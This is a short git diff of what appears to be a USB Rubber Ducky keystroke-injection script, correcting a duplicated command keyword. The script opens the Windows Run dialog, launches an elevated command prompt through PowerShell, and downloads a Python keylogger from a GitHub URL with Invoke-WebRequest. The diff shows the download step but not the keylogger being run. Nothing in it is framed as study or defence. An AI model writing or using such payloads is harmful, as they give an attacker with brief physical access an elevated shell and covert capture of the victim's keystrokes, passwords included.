@@ -1,7 +1,7 @@
 DELAY 200
 GUI r
 DELAY 50
-STRING STRING powershell Start-Process cmd -Verb runAs
+STRING powershell Start-Process cmd -Verb runAs
 ENTER
 DELAY 200
 STRING Invoke-WebRequest -Uri "https://raw.githubusercontent.com/ASL-rgb/keylogger/main/keylogger.py" -OutFile "keylogger.py"
